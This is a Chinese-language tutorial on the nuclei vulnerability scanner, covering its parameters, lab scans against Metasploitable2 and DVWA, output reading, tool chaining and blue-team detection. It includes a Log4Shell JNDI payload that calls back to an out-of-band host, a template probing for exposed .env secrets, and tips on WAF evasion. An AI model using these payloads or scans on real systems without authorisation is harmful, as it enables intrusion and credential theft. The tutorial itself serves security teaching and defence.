# nuclei（基于模板的漏洞扫描器）

> **一句话**：用 YAML 模板描述"怎么发请求、怎么判断命中"，然后拿几千个现成模板去打目标——速度快、误报低、可自定义。
> **分类**：漏洞分析 ｜ **Kali 包**：`nuclei` ｜ **官方文档**：<https://docs.projectdiscovery.io/tools/nuclei/overview>

## 1. 它解决什么问题

传统扫描器（[nikto](nikto.md)、OpenVAS）把"检测逻辑"编译进程序，你想加一条检查就得改代码。nuclei 反过来：**检测逻辑是一份 YAML 文件**（模板）。

```yaml
id: cve-2021-44228
info:
  name: Apache Log4j2 RCE
  severity: critical
http:
  - method: GET
    path: ["{{BaseURL}}"]
    headers:
      X-Api-Version: "${jndi:ldap://{{interactsh-url}}/a}"
    matchers:
      - type: word
        part: interactsh_protocol
        words: ["dns"]
```

带来的结果：

- **社区模板库巨大**（官方 `nuclei-templates` 项目有上万条模板），新 CVE 出来后通常**几小时内**就有模板。
- **误报极低**：模板作者可以做多点交叉验证（`matchers` + `conditions`），而不是"看到某个字符串就算命中"。
- **可自定义**：公司内部的检测逻辑可以写成模板，跟社区模板一起跑。

| 工具 | 定位 | 误报 | 速度 |
|------|------|------|------|
| **nuclei** | 模板驱动的精确检测 | 低 | 快（默认 150 请求/秒） |
| [nikto](nikto.md) | 广撒网的 Web 服务器配置扫描 | 偏高 | 慢（数千请求） |
| [wpscan](../03-Web应用/wpscan.md) | WordPress 专项 | 低 | 中 |
| [sqlmap](../03-Web应用/sqlmap.md) | SQL 注入专项自动化利用 | 低 | 中 |
| OpenVAS / Nessus | 综合漏洞管理平台 | 中 | 慢 |

**核心认知**：nuclei 的威力取决于**模板质量 + 你选的模板范围**。跑全量模板又快又全，但噪声大；用 `-tags` / `-severity` / `-t` 精确圈定范围才是实战方式。

## 2. 工作原理

```text
   nuclei -u https://target -t cves/ -severity critical,high
        │
   ┌────┴────────────────────────────────────────────────────┐
   │ ① 加载并筛选模板                                          │
   │    从 ~/nuclei-templates/（首次运行自动下载）读取 YAML    │
   │    按 -t / -tags / -severity / -id / -pt 等条件过滤        │
   │    模板要过语法校验（-nss 可关闭严格校验）                 │
   └────┬────────────────────────────────────────────────────┘
        │
   ┌────┴────────────────────────────────────────────────────┐
   │ ② 目标预处理                                              │
   │    非 URL 输入用 httpx 做存活探测（-nh 可关闭）            │
   │    按 -im 解析输入格式（list / burp / jsonl / yaml / ...） │
   │    -sa 时展开 DNS 记录关联的所有 IP                        │
   └────┬────────────────────────────────────────────────────┘
        │
   ┌────┴────────────────────────────────────────────────────┐
   │ ③ 并发执行模板（高阶能力）                                 │
   │    请求聚类：把多个模板的相同请求合并，减少重复发包        │
   │    -c 模板并发（默认 25）                                 │
   │    -bs 同一模板的并行主机数（默认 25）                     │
   │    -rl 全局限速（默认 150 请求/秒）                        │
   │    -ss 扫描策略：auto / host-spray / template-spray        │
   └────┬────────────────────────────────────────────────────┘
        │
   ┌────┴────────────────────────────────────────────────────┐
   │ ④ 匹配（matchers）与提取（extractors）                     │
   │    matcher 类型：word / regex / status / size / binary     │
   │    / dsl / xpath / json / favicon / ds 等                 │
   │    part：body / header / status / all / interactsh_*       │
   │    多 matcher 用 condition: and/or 组合 → 低误报           │
   │    extractor 用来从响应里抠数据（如版本号、token）          │
   └────┬────────────────────────────────────────────────────┘
        │
   ┌────┴────────────────────────────────────────────────────┐
   │ ⑤ OAST 外带验证（Interactsh）                              │
   │    "盲注类"漏洞无法靠响应体判断，改用带外 DNS/HTTP 回连：   │
   │    模板把 {{interactsh-url}} 注入 payload，nuclei 监听     │
   │    是否有 DNS/HTTP 回连 → 命中（几乎零误报）               │
   │    -ni 可关闭（会排除所有 OAST 模板）                      │
   └────┬────────────────────────────────────────────────────┘
        │
   -o 输出 / -jsonl / -me Markdown / -se SARIF / -je JSON / -pe PDF
```

几个使用上的关键点：

- **请求聚类（clustering）**：nuclei 会把"发往同一 URL 的相同请求"合并。所以跑 1000 个模板不等于发 1000 个包。`-dc` 可关闭（调试时用，能看到每条模板的真实请求）。
- **OAST 是 nuclei 的杀手锏**：像 Log4Shell、盲注 SSRF、XXE 这类"没有明显响应的漏洞"，传统扫描器只能猜；nuclei 用带外回连确认，**准确性接近 100%**。
- **模板分协议类型**（`-pt` 可选值）：`dns`、`file`、`http`、`headless`、`tcp`、`workflow`、`ssl`、`websocket`、`whois`、`code`、`javascript`。其中 `code` 和 `javascript` 需要显式开关（`-code`），`headless` 需要 `-headless`，因为它们能执行代码。
- **`-dast`**：启用 DAST/fuzzing 模板，会把参数和路径当作模糊测试点，请求量会大幅上升。

## 3. 安装与快速上手

```bash
sudo apt install nuclei
nuclei -version
nuclei -h | head -40
```

首次运行会自动下载 `nuclei-templates`（也可以 `nuclei -update-templates` 手动更新；`-reset` 可清空重来）。

最小可用命令：

```bash
# 1) 指定单个目标 + 指定一类模板
nuclei -u http://192.168.56.101 -t http/misconfiguration/

# 2) 只跑 critical / high 严重度的模板
nuclei -u http://192.168.56.101 -severity critical,high

# 3) 批量目标 + 输出文件
nuclei -l urls.txt -o nuclei_findings.txt
```

## 4. 核心参数详解

### 目标

| 参数 | 作用 | 使用建议 |
|------|------|----------|
| `-u, -target <url>` | 单个或多个目标 | 可重复或逗号分隔 |
| `-l, -list <file>` | 目标列表文件（一行一个） | 批量首选 |
| `-targets-inline <str>` | 内联多行目标（供模板 profile 用） | 少见 |
| `-eh, -exclude-hosts <h>` | 从输入中排除主机（IP/CIDR/主机名） | **保护关键设备/排除范围外资产** |
| `-resume <file>` | 断点续跑（会禁用聚类） | 长任务 |
| `-sa, -scan-all-ips` | 扫描 DNS 记录关联的所有 IP | 有 CDN/多 A 记录时 |
| `-iv, -ip-version <4\|6>` | 扫描使用的 IP 版本（默认 4） | 双栈 |
| `-im, -input-mode <mode>` | 输入格式：`list`（默认）/`burp`/`jsonl`/`yaml`/`openapi`/`swagger` | **直接吃 Burp 导出文件** |
| `-ro, -required-only` | 生成请求时只用必填字段 | — |
| `-sfv, -skip-format-validation` | 跳过输入格式校验 | 输入文件不规整时 |
| `-vtt, -vars-text-templating` | 对输入文件里的 vars 启用文本模板 | yaml 输入模式 |
| `-vfp, -var-file-paths <f>` | 用 yaml 文件注入变量 | — |
| `-no-stdin` | 禁用 stdin 处理 | 脚本化避免误读 |

### 模板选择与过滤

| 参数 | 作用 | 使用建议 |
|------|------|----------|
| `-t, -templates <p>` | 指定模板/模板目录（逗号分隔或文件） | 最精确的控制方式 |
| `-turl, -template-url <u>` | 从 URL 取模板 | 内部模板仓库 |
| `-nt, -new-templates` | 只跑最新版本新增的模板 | 日常增量巡检 |
| `-ntv, -new-templates-version <v>` | 只跑指定版本新增的模板 | — |
| `-as, -automatic-scan` | 用 wappalyzer 技术识别结果自动映射模板 | 省心；命中率高但不精确 |
| `-w, -workflows <p>` | 指定工作流（把多个模板串起来顺序执行） | 复杂检测链 |
| `-validate` | 只校验模板语法 | 写模板时 |
| `-nss, -no-strict-syntax` | 关闭严格语法检查 | 兼容老模板 |
| `-tl` | 列出符合当前过滤条件的模板 | 确认模板范围 |
| `-tgl` | 列出所有可用 tags | 找 tag 名 |
| `-td, -template-display` | 显示模板原始内容 | **审查模板在做什么（重要）** |
| `-code` | 允许加载 code 协议模板（能执行代码） | 只在你信任模板来源时开 |
| `-dut, -disable-unsigned-templates` | 禁用未签名/签名不匹配模板 | 生产环境建议开 |
| `-esc, -enable-self-contained` | 允许自包含模板 | — |
| `-egm, -enable-global-matchers` | 允许全局 matcher 模板 | — |
| `-file` | 允许加载 file 协议模板 | — |

**过滤维度**：

| 参数 | 作用 | 使用建议 |
|------|------|----------|
| `-s, -severity <v>` | 按严重度：`info`、`low`、`medium`、`high`、`critical`、`unknown` | **最常用的过滤维度** |
| `-es, -exclude-severity <v>` | 排除严重度 | 如排除 `info` 减少噪声 |
| `-tags <t>` | 按 tag 过滤（逗号分隔或文件） | 如 `-tags cve,wordpress` |
| `-etags, -exclude-tags <t>` | 排除 tag（如 `dos`、`fuzz`） | **排除危险 tag** |
| `-itags, -include-tags <t>` | 即使被默认/配置排除也强制包含 | — |
| `-id, -template-id <id>` | 按模板 ID（支持通配符） | 精确单点验证 |
| `-eid, -exclude-id <id>` | 排除模板 ID | — |
| `-a, -author <a>` | 按模板作者 | — |
| `-pt, -type <t>` | 按协议类型 | 如只跑 `http` |
| `-ept, -exclude-type <t>` | 排除协议类型 | — |
| `-tc, -template-condition <e>` | 按表达式条件选模板 | 高级 |
| `-em, -exclude-matchers <m>` | 排除指定 matcher | — |
| `-it/-et <p>` | 强制包含/排除模板路径 | — |

### 输出

| 参数 | 作用 | 使用建议 |
|------|------|----------|
| `-o, -output <file>` | 结果写入文件 | 必加 |
| `-silent` | **只显示命中结果**，不显示进度 | 脚本化必加 |
| `-j, -jsonl` | 以 JSONL 输出 | 与 `jq` 配合 | 
| `-je, -json-export <f>` / `-jle, -jsonl-export <f>` | 导出 JSON / JSONL | — |
| `-me, -markdown-export <dir>` | 导出 Markdown | 报告素材 |
| `-se, -sarif-export <f>` | 导出 SARIF | 接入 GitHub Code Scanning 等 |
| `-pe, -pdf-export <f>` | 导出 PDF | 交付 |
| `-nm, -no-meta` | 不打印结果元数据 | — |
| `-ts, -timestamp` | 打印时间戳 | — |
| `-ms, -matcher-status` | 显示匹配失败状态 | 调试 |
| `-rdb, -report-db <f>` | 报告数据库（持久化） | 长期跟踪 |
| `-or, -omit-raw` | 输出里省略请求/响应原文 | 减小体积、避免敏感数据泄露 |
| `-ot, -omit-template` | 省略编码后的模板 | 同上 |
| `-nc, -no-color` | 关闭颜色 | 重定向到文件 |
| `-rd, -redact <k>` | 对指定键（query/header/body）做脱敏 | **分享结果前必做** |
| `-sresp, -store-resp` / `-srd <dir>` | 保存所有请求/响应 | 留存证据（体积大） |

### 配置与网络

| 参数 | 作用 | 使用建议 |
|------|------|----------|
| `-config <file>` | 指定配置文件 | 固化默认参数 |
| `-tp, -profile <file>` / `-tpl, -profile-list` | 模板 profile / 列出社区 profile | 官方预设组合 |
| `-H, -header <k: v>` | 全局添加请求头 | 如加认证头 |
| `-V, -var <k=v>` | 自定义变量 | 模板里用 `{{var}}` 引用 |
| `-r, -resolvers <file>` | DNS 解析器列表 | 内网解析 |
| `-sr, -system-resolvers` | 用系统 DNS 做兜底 | — |
| `-dc, -disable-clustering` | 关闭请求聚类 | 调试/需要完整请求记录时 |
| `-fr, -follow-redirects` | 跟随 http 模板的重定向 | — |
| `-fhr, -follow-host-redirects` | 只跟随同主机重定向 | — |
| `-mr, -max-redirects <n>` | 最大重定向数（默认 10） | — |
| `-dr, -disable-redirects` | 禁用重定向 | — |
| `-passive` | 被动 HTTP 响应处理模式 | — |
| `-fh2, -force-http2` | 强制 HTTP/2 | — |
| `-ev, -env-vars` | 允许模板使用环境变量 | — |
| `-cc/-ck/-ca <file>` | 客户端证书/私钥/CA | 双向 TLS |
| `-i, -interface <if>` | 网络扫描使用的网卡 | — |
| `-sip, -source-ip <ip>` | 指定源 IP | — |
| `-sni <host>` | TLS SNI 主机名 | 虚拟主机 |
| `-lfa, -allow-local-file-access` | 允许访问本机任意文件 | **有风险，默认关闭** |
| `-lna, -restrict-local-network-access` | 阻断对本地/私网的连接 | **注意：会阻断内网扫描**，公网扫描可开 |
| `-dka, -dialer-keep-alive <d>` | 连接 keep-alive 时长 | — |
| `-rss, -response-size-save <n>` | 保存响应的最大字节数（默认 1048576） | — |
| `-rsr, -response-size-read <n>` | 读取响应的最大字节数 | — |
| `-tlsi, -tls-impersonate` | 实验性 JA3 TLS 指纹随机化 | 绕过 JA3 指纹检测 |
| `-hae, -http-api-endpoint <url>` | 实验性 HTTP API 端点 | — |
| `-reset` | 清空所有配置与数据（含模板） | 排障用 |

### 速率与并发

| 参数 | 作用 | 使用建议 |
|------|------|----------|
| `-rl, -rate-limit <n>` | 全局每秒最大请求数（默认 150） | **生产环境必须调低**，如 `-rl 20` |
| `-rld, -rate-limit-duration <d>` | 限速的时间窗口（默认 1s） | — |
| `-per-host-rate-limit` | 开启按主机限速（开启后全局限速变为无限） | — |
| `-bs, -bulk-size <n>` | 同一模板并行分析的主机数（默认 25） | — |
| `-c, -concurrency <n>` | 并行的模板数（默认 25） | — |
| `-pc, -payload-concurrency <n>` | 每个模板的 payload 并发（默认 25） | — |
| `-prc, -probe-concurrency <n>` | httpx 探测并发（默认 50） | — |
| `-tlc <n>` | 模板加载并发（默认 50） | — |
| `-timeout <n>` | 请求超时秒数（默认 10） | — |
| `-retries <n>` | 失败重试次数（默认 1） | — |
| `-mhe, -max-host-error <n>` | 主机错误上限，超过则跳过该主机（默认 30） | 防止卡在坏目标上 |
| `-nmhe, -no-mhe` | 不因错误跳过主机 | — |
| `-project` / `-project-path <dir>` | 用项目目录避免重复发相同请求 | 大范围扫描省流量 |
| `-spm, -stop-at-first-match` | 首次命中即停止该模板的后续请求 | 提速（可能破坏模板逻辑） |
| `-stream` | 流式处理，输入不排序 | — |
| `-ss, -scan-strategy <s>` | 扫描策略：`auto`/`host-spray`/`template-spray` | 目标多时 `host-spray`；模板多时 `template-spray` |
| `-nh, -no-httpx` | 关闭对非 URL 输入的 httpx 探测 | — |
| `-preflight-portscan` | 扫描前先做解析 + TCP 端口扫描过滤目标 | 大范围扫描省时间 |
| `-mt, -max-time <d>` | 最长运行时长（如 `1h`、`30m`） | 防止跑不完 |

### OAST（带外验证）

| 参数 | 作用 | 使用建议 |
|------|------|----------|
| `-iserver, -interactsh-server <u>` | 自建 Interactsh 服务器 | 不希望回连数据经过公共服务器时 |
| `-itoken, -interactsh-token <t>` | 自建服务器认证令牌 | — |
| `-ni, -no-interactsh` | 关闭 Interactsh，并排除 OAST 模板 | **会降低盲注类漏洞的检出率**，慎用 |
| `-interactions-cache-size` / `-interactions-eviction` / `-interactions-poll-duration` / `-interactions-cooldown-period` | 回连缓存与轮询调优 | 慢速环境调大 cooldown |

### Fuzzing / DAST

| 参数 | 作用 | 使用建议 |
|------|------|----------|
| `-dast` | 启用 DAST（fuzz）模板 | 请求量大幅上升 |
| `-fuzz` | 同上（已废弃写法） | — |
| `-ft, -fuzzing-type <s>` | 覆盖模板的 fuzz 类型：`replace`/`prefix`/`postfix`/`infix` | — |
| `-fm, -fuzzing-mode <s>` | 覆盖 fuzz 模式：`multiple`/`single` | — |
| `-fa, -fuzz-aggression <s>` | fuzz 强度：`low`/`medium`/`high`（默认 low） | 从 low 开始 |
| `-cs, -fuzz-scope <re>` / `-cos, -fuzz-out-scope <re>` | 限定/排除 fuzz 的 URL | **必须设好范围** |
| `-dfp, -display-fuzz-points` | 显示 fuzz 点（调试） | — |
| `-fuzz-param-frequency <n>` | 跳过无趣参数的频率（默认 10） | — |
| `-dts, -dast-server` / `-dtsa <addr>` / `-dtst <token>` / `-dtr <f>` | DAST 服务器模式（实时 fuzz）与报告 | 高级 |

### Headless / 其他

| 参数 | 作用 |
|------|------|
| `-headless` | 启用需要无头浏览器的模板（Linux 下 root 运行会禁用沙箱） |
| `-page-timeout <n>` | 无头模式每页等待秒数（默认 20） |
| `-sb, -show-browser` | 显示浏览器窗口 |
| `-ho, -headless-options <o>` | 附加 Chrome 启动参数 |
| `-sc, -system-chrome` | 用本机 Chrome |
| `-cdpe, -cdp-endpoint <u>` | 通过 CDP 连远程浏览器 |
| `-lha, -list-headless-action` | 列出可用无头动作 |
| `-uc, -uncover` 系列 | 用 Uncover 引擎（Shodan/Censys/FOFA 等）发现目标 |
| `-debug` / `-dreq` / `-dresp` | 显示请求与响应 |
| `-p, -proxy <url>` | HTTP/SOCKS5 代理（逗号分隔或文件） |
| `-pi, -proxy-internal` | 代理所有内部请求 |
| `-ldf, -list-dsl-function` | 列出所有 DSL 函数签名 |
| `-tlog, -trace-log <f>` / `-elog, -error-log <f>` | 请求追踪日志 / 错误日志 |

## 5. 实战演练

**环境**：本地实验环境。

- DVWA 容器：`http://192.168.56.102:8080`
- Metasploitable2：`http://192.168.56.101`
- Juice Shop（可选）：`docker run -d -p 3000:3000 bkimminich/juice-shop`
- 攻击机 Kali：`192.168.56.10`

> nuclei 是**主动**扫描器，会对目标发大量请求。只对授权目标使用。公网目标请把 `-rl` 调到 10~20。

### 场景 1：最小可用扫描

```bash
nuclei -u http://192.168.56.101 -o nuclei_basic.txt
```

预期输出片段：

```text
[INF] Current nuclei version: v3.11.1 (outdated)
[INF] Templates loaded for current scan: 8123
[INF] Executing 8123 signed templates from projectdiscovery/nuclei-templates
[INF] Targets loaded for current scan: 1
[apache-detect:tech-detect] [http] [info] http://192.168.56.101 ["Apache/2.2.8 (Ubuntu) DAV/2"]
[phpmyadmin-panel:detect] [http] [info] http://192.168.56.101/phpMyAdmin/
[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.56.101
[INF] Scan completed in 3m12.4s. 3 matches found.
```

解读：
- `[模板ID:matcher名] [协议] [严重度] 目标 [提取结果]` 是标准输出格式。
- 默认跑全量模板（8000+ 条），日志里会明确列出加载的模板数。
- 全是 `info` 级别——说明这个靶机在 nuclei 的模板库覆盖下没有 critical/high 的命中。

### 场景 2：只看高危（实战最常用）

```bash
nuclei -u http://192.168.56.101 -severity critical,high -silent \
       -o nuclei_critical.txt -jsonl -je nuclei_critical.jsonl
jq -r '[.info.severity, .template-id, .matched-at] | @tsv' nuclei_critical.jsonl | column -t
```

解读：`-severity critical,high` 把噪声过滤掉 90% 以上，这是做**报告**时该用的方式。`-silent` 只输出命中项。JSONL 用 `jq` 一行就能整理成表。

### 场景 3：按 tags 精确圈定范围

```bash
# 只看 CVE 类和 WordPress 相关
nuclei -u http://192.168.56.101 -tags cve,wordpress -silent -o nuclei_tags.txt

# 排除有副作用的类别（DoS、fuzz）
nuclei -u http://192.168.56.101 -etags dos,fuzz,brute-force -silent

# 只跑 http 协议、medium 及以上
nuclei -u http://192.168.56.101 -pt http -severity medium,high,critical -silent

# 先用 -tl 确认过滤出来的模板范围（不执行）
nuclei -tags cve -severity critical -tl | head -20
```

解读：`-etags dos` **必须养成习惯**——有些模板会做资源消耗测试甚至触发重启，在生产环境跑全量不收窄范围是事故。

### 场景 4：批量目标 + 限速 + 生产友好参数

```bash
cat > urls.txt <<'EOF'
http://192.168.56.101
http://192.168.56.102:8080
EOF

nuclei -l urls.txt \
  -severity medium,high,critical \
  -etags dos,fuzz \
  -rl 30 -c 10 -bs 10 \
  -timeout 10 -retries 2 -mhe 10 \
  -mt 30m \
  -eh 192.168.56.1 \
  -rd token,password,authorization \
  -o nuclei_batch.txt -jsonl -je nuclei_batch.jsonl -me report_dir
```

逐项解读：

| 参数 | 为什么这么设 |
|------|-------------|
| `-rl 30` | 把全局限速从 150 降到 30，避免打挂目标或被 WAF 封 |
| `-c 10 -bs 10` | 降低模板并发与每模板主机并发 |
| `-etags dos,fuzz` | 排除有破坏性/高消耗的模板 |
| `-mhe 10` | 主机错误超过 10 次就跳过，避免卡死 |
| `-mt 30m` | 总时长上限 |
| `-eh 192.168.56.1` | 排除宿主机接口，不扫不该扫的 |
| `-rd token,password,authorization` | **输出脱敏**，避免把凭据写进结果文件 |
| `-me report_dir` | 同时导出 Markdown，直接当报告素材 |

### 场景 5（进阶）：DAST 模糊测试 + 自定义变量 + 模板审查

```bash
# DAST：把请求参数当作 fuzz 点（会显著增加请求量，务必先限速）
nuclei -u "http://192.168.56.102:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  -dast -fa low -rl 10 -cos ".*logout.*" -silent

# 传入自定义变量（模板里用 {{my_token}} 引用）
nuclei -u http://192.168.56.101 -V "username=admin" -V "password=admin"

# 审查模板到底发了什么请求（写模板或评估第三方模板时必做）
nuclei -id cve-2021-44228 -td | head -60

# 调试：关闭聚类，看每条模板的真实请求
nuclei -u http://192.168.56.101 -t http/misconfiguration/ -dc -debug 2>&1 | head -40
```

解读：
- `-dast` 会把 URL 参数、路径当 fuzz 点，配合 `-cos` 排除 `/logout` 之类**会破坏会话**的路径。
- `-td`（`-template-display`）能打印模板原文。**在跑任何来源不明的第三方模板前，务必先 `-td` 看一遍**——模板可以发送任意 HTTP 请求，也可以（开 `-code` 时）执行代码。
- `-dc -debug` 能看到聚类前每条模板的真实请求，是排查"为什么没命中"的标准手段。

### 场景 6：写一个自己的模板

```bash
mkdir -p ~/my-templates && cat > ~/my-templates/check-backup-file.yaml <<'EOF'
id: check-backup-file

info:
  name: 检测常见的备份文件泄露
  author: lab
  severity: high
  description: 检查 Web 根目录下是否存在常见的备份/配置文件
  tags: exposure,backup

http:
  - method: GET
    path:
      - "{{BaseURL}}/backup.zip"
      - "{{BaseURL}}/www.tar.gz"
      - "{{BaseURL}}/.env"
    matchers-condition: and
    matchers:
      # 状态码必须是 200
      - type: status
        status:
          - 200
      # 且响应体不能是那个"万能 200 页面"
      - type: word
        part: header
        words:
          - "Content-Type: application"
        negative: true
      # zip 文件应当以 PK 开头；.env 应当有关键字
      - type: regex
        part: body
        regex:
          - "(?i)(DB_PASSWORD|APP_KEY|API_SECRET)"
EOF

# 先校验语法
nuclei -t ~/my-templates/check-backup-file.yaml -validate

# 再执行
nuclei -u http://192.168.56.101 -t ~/my-templates/check-backup-file.yaml -silent
```

解读：模板的骨架是 `id` + `info` + 协议块（这里是 `http`）。关键是 **`matchers-condition: and` 搭配多个互补的 matcher**——只靠"状态码 200"会有大量误报，加上"响应体含 `DB_PASSWORD`"才够精确。这就是 nuclei 相比 [nikto](nikto.md) 误报低的原因。

## 6. 输出解读

### 终端输出格式

```text
[模板ID:matcher名] [协议] [严重度] 匹配到的URL [提取结果]
```

| 部分 | 含义 |
|------|------|
| 模板 ID | 对应模板文件名的 `id` 字段；`cve-YYYY-NNNNN` 形式的直接对应 CVE |
| matcher 名 | 命中的具体 matcher（一个模板可能有多个） |
| 协议 | `http` / `dns` / `tcp` / `ssl` / `headless` / `code` … |
| 严重度 | `info` / `low` / `medium` / `high` / `critical` / `unknown` |
| 目标 | 实际命中的 URL |
| 提取结果 | extractor 抠出来的内容（版本号、token、文件名等） |

### JSONL 字段（最常用的几个）

| 字段 | 含义 |
|------|------|
| `.template-id` | 模板 ID |
| `.info.name` / `.info.severity` / `.info.tags` | 名称/严重度/标签 |
| `.matched-at` | 命中的完整 URL |
| `.host` | 主机 |
| `.type` | 协议类型 |
| `.matcher-name` | 命中的 matcher |
| `.extracted-results` | extractor 结果数组 |
| `.curl-command` | **可复现该请求的 curl 命令**（最实用的字段） |
| `.request` / `.response` | 原始请求/响应（`-or` 可省略） |

**用 `curl-command` 复核命中**（推荐工作流）：

```bash
jq -r '. | select(.info.severity=="high" or .info.severity=="critical") | "\(.info.name)\n\(.curl-command)\n"' nuclei_batch.jsonl
```

### 判断要点

- **`info` 级别不是噪音，但也不是漏洞**：像 `tech-detect`、`http-missing-security-headers` 属于情报/加固建议。报告里应单独归类。
- **必须复核所有 high/critical**：nuclei 误报率低但非零（尤其是目标做了软 404 或统一错误页时）。
- **`-ms`（`-matcher-status`）** 能显示"匹配失败"的原因，是排查"为什么没命中"的关键。

## 7. 与其他工具配合

```bash
# 1) nmap 找 Web 端口 -> nuclei
sudo nmap -p80,443,8080,8443 --open -oG - 192.168.56.0/24 | \
  awk '/Ports:/{print $2}' | sed 's/.*/http:\/\/&/' > urls.txt
nuclei -l urls.txt -severity medium,high,critical -silent -o nuclei_out.txt

# 2) whatweb 识别技术 -> 用 tags 定向跑 nuclei
whatweb -a 1 http://192.168.56.101 | grep -qi wordpress && \
  nuclei -u http://192.168.56.101 -tags wordpress -silent

# 3) nuclei 结果 -> 人工复核（用 curl-command）
nuclei -l urls.txt -jsonl -je out.jsonl -silent
jq -r '. | select(.info.severity=="critical") | .curl-command' out.jsonl | while read -r c; do
  echo "=== $c"; eval "$c" 2>&1 | head -5
done

# 4) nuclei 发现版本号 -> searchsploit
jq -r '.info.name' out.jsonl | grep -oP '\d+\.\d+[\d.]*' | sort -u | head -20
searchsploit "apache 2.2"

# 5) nuclei -> SARIF -> GitHub 代码扫描 / 平台仪表盘
nuclei -l urls.txt -se nuclei.sarif -silent

# 6) 与 nikto 互补：nikto 的线索用 nuclei 验证
nikto -h http://192.168.56.101 -Tuning 2 -o nikto.json -Format json -nointeractive
nuclei -u http://192.168.56.101 -severity high,critical -silent
```

## 8. 常见坑与排错

| 现象 | 原因 | 解决 |
|------|------|------|
| `no templates provided` / `Templates loaded for current scan: 0` | 模板未下载或被过滤光了 | `nuclei -update-templates`；用 `-tl` 确认过滤条件 |
| 明明有漏洞却没报 | 模板范围过窄 / 输入不是合法 URL / 目标软 404 | 用 `-ms` 看 matcher 状态；`-dc -debug` 看真实请求；手工 `curl` 复核 |
| 命中率异常高，全是误报 | 目标对任意路径返回 200（软 404） | 改用更精确的模板（`-severity` + `-etags`），或加 `-pt http` 收窄 |
| 被 WAF 拦截 / IP 被封 | 默认 150 请求/秒太快 | `-rl 10 -c 5`；`-tlsi` 随机化 TLS 指纹；加 `-p` 走代理 |
| 跑太久跑不完 | 全量模板 + 多目标 | `-severity critical,high`、`-tags`、`-mt 30m`、`-spm` |
| 生产环境出事故（服务被打挂） | 跑了 `dos`/`fuzz` 类模板 | `-etags dos,fuzz`；`-rl 10` |
| OAST 模板全都不命中 | Interactsh 无法回连（出网被限制） | 在有出网的机器上跑；或自建 `-iserver` |
| 内网目标全部超时 | 默认开了本地网络访问限制 | 检查是否设了 `-lna`（它会阻断私网连接） |
| 结果文件里有明文密码 | 请求/响应被完整记录下来 | `-or` 省略 raw；`-rd token,password,authorization` 脱敏 |
| 模板报 syntax error | 老模板与新版语法不兼容 | `-nss` 关闭严格校验（需评估风险） |
| `-code` 模板不执行 | 未加 `-code` 开关 | 确认模板可信后加 `-code` |
| 无头模板跳过 | 未加 `-headless` | 加 `-headless`（Linux root 下沙箱会被禁用） |
| 输出里没有时间戳/主机名难对照 | 默认元数据在非 silent 模式才显示 | 加 `-ts`，或用 `-jsonl` |
| 扫描结果与上次不同 | 模板库更新了 / 目标变了 | 记录 `nuclei -version` 与模板版本，便于比对 |

## 9. 防御视角（蓝队）

nuclei 的模板里既有"温和的信息探测"，也有"带破坏性的模糊测试"，防守策略要分开看。

- **可检测的流量特征**：
  - **模板指纹**：社区模板的 payload 高度固定（特定路径、特定 header 值、特定 User-Agent）。把这些特征提取成 WAF 规则命中率很高。
  - **速率**：默认 150 请求/秒，从单个 IP 发出——远超正常用户。**速率阈值是最有效的检测手段**。
  - **请求聚类**：nuclei 会把相同请求合并，所以流量里会有"重复相同请求但路径变化"的模式。
  - **OAST 回连**：nuclei 用 Interactsh 域名（`oast.pro`、`oast.live`、`oast.site`、`oast.online`、`oast.fun`、`oast.me`）做带外验证。**在 DNS/出网日志里匹配这些域名，可以精确识别出 OAST 类扫描**——这是很高价值的检测点，因为只有扫描器才会解析这些域名。
  - **速率限制参数**：`-rl` 可以调低，慢速扫描更像正常用户；此时需要长期基线对比。
- **缓解措施**：
  - **边界限速与封禁**：对单源请求速率做限制；把异常源加入临时黑名单。
  - **阻断 OAST 域名解析**：在内网 DNS 上把 `oast.*` 等 Interactsh 域名解析到黑洞——这会直接让所有 OAST 模板失效，且不影响正常业务。**这是性价比极高的一个措施**。
  - **WAF 虚拟补丁**：对已知的 CVE 模板 payload 做签名拦截。
  - **减少暴露面**：nuclei 命中 `info` 级的很多东西（`tech-detect`、缺失安全头、暴露的 `/phpMyAdmin/`）属于"本不该存在"，删掉就清零了。
  - **软 404 的反向利用**：给所有不存在的路径统一返回 200 + 同一页面，确实能提升扫描器误报率——但这属于"安全通过混淆"，会伤害正常用户的体验，一般不推荐作为主策略。
- **紫队用法**：nuclei 是**验证检测能力最好的工具**。定期用它在授权范围内跑一遍，看你的 WAF/IDS 是否触发了告警——没触发就说明检测规则该补了。同时用 `-tags cve` 跑一遍，可以量化"当前暴露面还有多少未修复的已知漏洞"。

## 10. 参考

- 官方文档：<https://docs.projectdiscovery.io/tools/nuclei/overview>
- 官方仓库：<https://github.com/projectdiscovery/nuclei>
- 社区模板库：<https://github.com/projectdiscovery/nuclei-templates>
- 模板语法文档：<https://docs.projectdiscovery.io/templates/introduction>
- Kali 工具页：<https://www.kali.org/tools/nuclei/>
- 用法核实：本教程参数取自 `nuclei v3.11.1` 的 `nuclei -h` 实际输出（已在本机下载对应版本二进制运行核对）

---

**相关教程**：[nikto](nikto.md) ｜ [searchsploit](searchsploit.md) ｜ [lynis](lynis.md) ｜ [openssl](openssl.md) ｜ [whatweb](../01-信息搜集/whatweb.md) ｜ [nmap](../01-信息搜集/nmap.md) ｜ [wpscan](../03-Web应用/wpscan.md)
